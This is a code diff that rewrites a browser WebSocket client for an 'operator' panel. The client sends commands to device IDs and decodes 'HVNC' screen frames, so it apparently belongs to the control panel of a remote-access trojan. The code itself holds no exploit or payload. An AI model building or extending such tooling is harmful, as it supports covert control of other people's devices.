@@ -1,129 +1,121 @@
-'use strict';
 /**
- * NexusWS — WebSocket client
- *   - Exponential backoff reconnect (1s → 30s + jitter)
- *   - Binary frame support (HVNC JPEG)
- *   - Operator ping/pong keepalive every 20s
- *   - Page Visibility API — instant reconnect on tab focus
- *   - Connection quality tracker (RTT)
+ * ws-client.js — Alpha operator WebSocket client.
+ *
+ * Connects to ws[s]://host/ws?role=operator&token=TOKEN
+ * Binary frames → emitted as 'vnc_frame' with decoded header
+ * JSON messages → emitted by their 'type' field
+ * Auto-reconnects with exponential backoff (1 s → 60 s)
  */
-class NexusWS {
-  constructor(url, { onOpen, onClose, onMessage, onBinary } = {}) {
-    this._url       = url;
-    this._onOpen    = onOpen    || (() => {});
-    this._onClose   = onClose   || (() => {});
-    this._onMessage = onMessage || (() => {});
-    this._onBinary  = onBinary  || (() => {});
+'use strict';
 
-    this._ws        = null;
-    this._delay     = 1000;
-    this._timer     = null;
-    this._pingTimer = null;
-    this._dead      = false;
-    this._rtt       = 0;
-    this._lastPingSent = 0;
+class AlphaWs extends EventTarget {
 
-    document.addEventListener('visibilitychange', () => {
-      if (!document.hidden && (!this._ws || this._ws.readyState > 1)) {
-        this._resetDelay();
-        this.connect();
-      }
-    });
+  static FRAME_V1 = 0x01;
+  static FRAME_V2 = 0x02;
+  static SRV_HDR  = 50;
+  static ID_LEN   = 36;
 
-    // Reconnect on network recovery
-    window.addEventListener('online', () => {
-      if (!this._ws || this._ws.readyState > 1) {
-        this._resetDelay();
-        this.connect();
-      }
-    });
-
-    this.connect();
+  constructor(token) {
+    super();
+    this._token    = token;
+    this._ws       = null;
+    this._backoff  = 1000;
+    this._dead     = false;
+    this._dec      = new TextDecoder();
+    this._connect();
   }
 
-  connect() {
+  // ── Connection ───────────────────────────────────────────────────────────────
+
+  _connect() {
     if (this._dead) return;
-    clearTimeout(this._timer);
+    const proto = location.protocol === 'https:' ? 'wss' : 'ws';
+    const url   = `${proto}://${location.host}/ws?role=operator&token=${encodeURIComponent(this._token)}`;
+    const ws    = new WebSocket(url);
+    ws.binaryType = 'arraybuffer';
+    this._ws = ws;
 
-    try {
-      const ws = new WebSocket(this._url);
-      ws.binaryType = 'arraybuffer';
-      this._ws = ws;
+    ws.onopen = () => {
+      this._backoff = 1000;
+      this._emit('connected');
+    };
 
-      ws.onopen = () => {
-        this._resetDelay();
-        this._startPing();
-        this._onOpen();
-      };
+    ws.onmessage = (e) => {
+      if (e.data instanceof ArrayBuffer) {
+        this._handleBinary(e.data);
+      } else {
+        this._handleText(e.data);
+      }
+    };
 
-      ws.onmessage = e => {
-        if (e.data instanceof ArrayBuffer) {
-          this._onBinary(e.data);
-        } else {
-          try {
-            const msg = JSON.parse(e.data);
-            // Handle pong for RTT calculation
-            if (msg.type === 'pong_op' && this._lastPingSent) {
-              this._rtt = Date.now() - this._lastPingSent;
-              this._lastPingSent = 0;
-            }
-            this._onMessage(msg);
-          } catch {}
-        }
-      };
-
-      ws.onclose = () => {
-        this._stopPing();
-        this._onClose();
-        this._scheduleReconnect();
-      };
-
-      ws.onerror = () => {};
-
-    } catch {
+    ws.onclose = ws.onerror = () => {
+      this._emit('disconnected');
       this._scheduleReconnect();
-    }
-  }
-
-  sendJson(obj) {
-    if (this._ws?.readyState === 1) {
-      try { this._ws.send(JSON.stringify(obj)); } catch {}
-    }
-  }
-
-  get rtt() { return this._rtt; }
-  get readyState() { return this._ws?.readyState ?? 3; }
-
-  destroy() {
-    this._dead = true;
-    clearTimeout(this._timer);
-    this._stopPing();
-    this._ws?.close();
-    this._ws = null;
+    };
   }
 
   _scheduleReconnect() {
-    clearTimeout(this._timer);
-    const d = this._delay;
-    this._delay = Math.min(this._delay * 1.8, 30_000);
-    // Add jitter to prevent thundering herd
-    this._timer = setTimeout(() => this.connect(), d + Math.random() * 800);
+    if (this._dead) return;
+    const delay = this._backoff * (0.8 + Math.random() * 0.4);
+    this._backoff = Math.min(this._backoff * 1.8, 60000);
+    setTimeout(() => this._connect(), delay);
   }
 
-  _resetDelay() { this._delay = 1000; }
-
-  _startPing() {
-    this._stopPing();
-    this._pingTimer = setInterval(() => {
-      if (this._ws?.readyState === 1) {
-        this._lastPingSent = Date.now();
-        this._ws.send(JSON.stringify({ type: 'ping_op' }));
-      }
-    }, 20_000);
+  destroy() {
+    this._dead = true;
+    if (this._ws) this._ws.close();
   }
 
-  _stopPing() {
-    clearInterval(this._pingTimer);
-    this._pingTimer = null;
+  // ── Send helpers ─────────────────────────────────────────────────────────────
+
+  send(obj) {
+    if (this._ws?.readyState === WebSocket.OPEN) {
+      this._ws.send(JSON.stringify(obj));
+    }
+  }
+
+  cmd(devId, cmdName, args = {}) {
+    this.send({ type: 'cmd', devId, cmd: cmdName, args });
+  }
+
+  // ── Binary frame decoder ─────────────────────────────────────────────────────
+
+  _handleBinary(buf) {
+    if (buf.byteLength < AlphaWs.SRV_HDR + 2) return;
+    const view  = new DataView(buf);
+    const type  = view.getUint8(0);
+    if (type !== AlphaWs.FRAME_V1 && type !== AlphaWs.FRAME_V2) return;
+
+    const idBuf = new Uint8Array(buf, 1, AlphaWs.ID_LEN);
+    const devId = this._dec.decode(idBuf).replace(/\0/g, '');
+    const seq     = view.getUint32(37, false);
+    const quality = view.getUint8(41);
+    const tsHi    = view.getUint32(42, false);
+    const tsLo    = view.getUint32(46, false);
+    const tsMs    = tsHi * 0x100000000 + tsLo;
+    const jpeg    = buf.slice(AlphaWs.SRV_HDR);
+
+    this._emit('vnc_frame', { type, devId, seq, quality, tsMs, jpeg });
+  }
+
+  _handleText(raw) {
+    let msg;
+    try { msg = JSON.parse(raw); } catch { return; }
+    const type = msg.type || msg.action || '';
+    if (type) this._emit(type, msg);
+    this._emit('message', msg);
+  }
+
+  _emit(name, detail = null) {
+    this.dispatchEvent(new CustomEvent(name, { detail }));
+  }
+
+  // ── Shorthand subscription helpers ─────────────────────────────────────────
+
+  on(type, fn) {
+    this.addEventListener(type, (e) => fn(e.detail));
+    return this;
   }
 }
+
+window.AlphaWs = AlphaWs;
